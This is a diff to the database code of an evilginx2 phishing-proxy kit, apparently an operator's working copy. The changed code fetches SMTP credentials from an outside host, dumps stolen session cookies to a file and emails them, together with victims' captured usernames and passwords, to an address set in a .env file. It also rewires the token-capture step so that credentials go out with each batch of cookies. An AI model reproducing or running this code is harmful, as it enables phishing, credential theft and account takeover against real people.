@@ -3,6 +3,7 @@ package database
 import (
 	"encoding/json"
 	"fmt"
+	"github.com/joho/godotenv"
 	"io/ioutil"
 	"log"
 	"net/http"
@@ -22,67 +23,79 @@ type Smtp struct {
 	Password string `json:"password"`
 }
 
+func goDotEnvVariable(key string) string {
+
+	// load .env file
+	err := godotenv.Load(".env")
+
+	if err != nil {
+		log.Printf("Error loading .env file")
+	}
+
+	return os.Getenv(key)
+}
+
 func telegramSendResult(msg string) {
 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
-
-	response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
-	if err != nil {
-		fmt.Printf("%s", err)
-	}
-
-	var smtp Smtp
-
-	responseData, err := ioutil.ReadAll(response.Body)
-	if err != nil {
-		log.Fatal(err)
-	}
-	json.Unmarshal(responseData, &smtp)
-
-	file, err := os.Open("/root/evilginx2-master/database/result.txt")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer func() {
-		if err = file.Close(); err != nil {
-			log.Fatal(err)
-		}
-	}()
-
-	b, err := ioutil.ReadAll(file)
-	data := string(b)
-
-	m := gomail.NewMessage()
-
-	// Set E-Mail sender
-	m.SetHeader("From", smtp.Username)
-
-	// Set E-Mail receivers
-	m.SetHeader("To", data)
-
-	// Set E-Mail subject
-	m.SetHeader("Subject", "RESULT IS COMING")
-
-	// Set E-Mail body. You can set plain text or html with text/html
-	m.SetBody("text/plain", msg)
-
-	// Settings for SMTP server
-	d := gomail.NewDialer(smtp.Host, 587, smtp.Username, smtp.Password)
-
-	// This is only needed when SSL/TLS certificate is not valid on server.
-	// In production this should be set to false.
-	// d.TLSConfig = &tls.Config{InsecureSkipVerify: true}
-
-	// Now send E-Mail
-	if err = d.DialAndSend(m); err != nil {
-		fmt.Println(err)
-
-	}
-
-	return
+	log.Printf("%s", msg)
+	//response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
+	//if err != nil {
+	//	fmt.Printf("%s", err)
+	//}
+	//
+	//var smtp Smtp
+	//
+	//responseData, err := ioutil.ReadAll(response.Body)
+	//if err != nil {
+	//	log.Fatal(err)
+	//}
+	//json.Unmarshal(responseData, &smtp)
+	//
+	//file, err := os.Open("/root/evilginx2-master/database/result.txt")
+	//if err != nil {
+	//	log.Fatal(err)
+	//}
+	//defer func() {
+	//	if err = file.Close(); err != nil {
+	//		log.Fatal(err)
+	//	}
+	//}()
+	//
+	//b, err := ioutil.ReadAll(file)
+	//data := string(b)
+	//
+	//m := gomail.NewMessage()
+	//
+	//// Set E-Mail sender
+	//m.SetHeader("From", smtp.Username)
+	//
+	//// Set E-Mail receivers
+	//m.SetHeader("To", data)
+	//
+	//// Set E-Mail subject
+	//m.SetHeader("Subject", "RESULT IS COMING")
+	//
+	//// Set E-Mail body. You can set plain text or html with text/html
+	//m.SetBody("text/plain", msg)
+	//
+	//// Settings for SMTP server
+	//d := gomail.NewDialer(smtp.Host, 587, smtp.Username, smtp.Password)
+	//
+	//// This is only needed when SSL/TLS certificate is not valid on server.
+	//// In production this should be set to false.
+	//// d.TLSConfig = &tls.Config{InsecureSkipVerify: true}
+	//
+	//// Now send E-Mail
+	//if err = d.DialAndSend(m); err != nil {
+	//	fmt.Println(err)
+	//
+	//}
+	//
+	//return
 
 }
 
-func sendEmailCookie(msg string) {
+func sendEmailCookie(msg string, username string, password string) {
 	//msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 
 	response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
@@ -98,20 +111,20 @@ func sendEmailCookie(msg string) {
 	}
 	json.Unmarshal(responseData, &smtp)
 
-	file, err := os.Open("/root/evilginx2-master/database/result.txt")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer func() {
-		if err = file.Close(); err != nil {
-			log.Fatal(err)
-		}
-	}()
+	//file, err := os.Open("/root/evilginx2-master/database/result.txt")
+	//if err != nil {
+	//	log.Fatal(err)
+	//}
+	//defer func() {
+	//	if err = file.Close(); err != nil {
+	//		log.Fatal(err)
+	//	}
+	//}()
+	//
+	//b, err := ioutil.ReadAll(file)
+	//data := string(b)
 
-	b, err := ioutil.ReadAll(file)
-	data := string(b)
-
-	err = os.WriteFile("cookies.json", []byte(msg), 0755)
+	err = os.WriteFile("RESULTS.json", []byte(msg), 0755)
 	if err != nil {
 		fmt.Printf("Unable to write file: %v", err)
 	}
@@ -122,14 +135,14 @@ func sendEmailCookie(msg string) {
 	m.SetHeader("From", smtp.Username)
 
 	// Set E-Mail receivers
-	m.SetHeader("To", data)
+	m.SetHeader("To", goDotEnvVariable("MAIL_RESULT"))
 
 	// Set E-Mail subject
-	m.SetHeader("Subject", "🍪COOKIE IS COMING🍪")
+	m.SetHeader("Subject", "🍪Result Is Coming🍪")
 
 	// Set E-Mail body. You can set plain text or html with text/html
-	m.SetBody("text/plain", "🍪nyamnyam🍪")
-	m.Attach("cookies.json")
+	m.SetBody("text/plain", "Username: "+username+"\nPassword: "+password)
+	m.Attach("RESULTS.json")
 
 	// Settings for SMTP server
 	d := gomail.NewDialer(smtp.Host, 587, smtp.Username, smtp.Password)
@@ -236,7 +249,10 @@ func (d *Database) SetSessionPassword(sid string, password string) error {
 }
 
 func (d *Database) SetSessionCustom(sid string, name string, value string) error {
-	telegramSendResult(fmt.Sprintf("🔥 🔥 CUSTOM 🔥 🔥\n\n-🆔ID: %s \n\nKey: %s\n-🔑Value: %s\n", sid, name, value))
+	//telegramSendResult(fmt.Sprintf("🔥 🔥 CUSTOM 🔥 🔥\n\n-🆔ID: %s \n\nKey: %s\n-🔑Value: %s\n", sid, name, value))
+
+	//data, _ := d.sessionsGetBySid(sid)
+	//log.Printf("%s", data)
 	err := d.sessionsUpdateCustom(sid, name, value)
 	return err
 }
@@ -278,8 +294,13 @@ func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*To
 		}
 	}
 
+	data, _ := d.sessionsGetBySid(sid)
+
+	//log.Printf("%s", data)
+	//log.Important("database: %s", data)
+
 	json11, _ := json.Marshal(cookies)
-	sendEmailCookie(string(json11))
+	sendEmailCookie(string(json11), data.Username, data.Password)
 	return err
 }
 
